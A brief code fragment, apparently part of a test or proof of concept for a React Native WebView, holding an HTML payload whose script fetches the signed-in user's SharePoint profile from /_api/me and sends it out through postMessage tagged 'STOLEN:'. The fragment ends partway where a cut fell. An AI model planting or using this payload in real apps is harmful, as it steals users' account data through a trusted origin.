    html: `<html><body>
      <script>
        // This script runs with same-origin context of sharepoint.com
        fetch('https://sharepoint.com/_api/me')
          .then(r => r.text())
          .then(d => window.ReactNativeWebView.postMessage('STOLEN:' + d));
